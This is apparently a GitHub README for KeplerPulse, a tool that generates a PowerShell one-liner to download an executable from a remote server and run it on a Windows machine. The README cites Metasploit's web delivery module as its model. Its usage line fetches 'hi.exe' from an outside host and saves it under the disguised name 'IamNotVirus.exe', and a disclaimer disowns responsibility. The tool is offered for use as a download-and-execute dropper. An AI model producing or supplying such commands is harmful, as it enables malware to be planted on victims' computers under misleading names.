# keplerpulse
KeplerPulse is a tool that generates a Powershell command that once executed on a Windows Machine, Downloads and executes your desired Executable on it. 

That's it. 

This was inspired by metasploit's web delivery module, But KeplerPulse isn't popping shells or hosting directly. Basically you can create such command without this tool.


### USAGE 
```bash
git clone https://github.com/quantumcore/keplerpulse
cd keplerpulse
sudo ./install.sh
keplerpulse --p https://myfileserver.com/hi.exe C:/Users/%USERNAME%/IamNotVirus.exe 
```

**Whatever you may do with keplerpulse is your own responsiblity.**
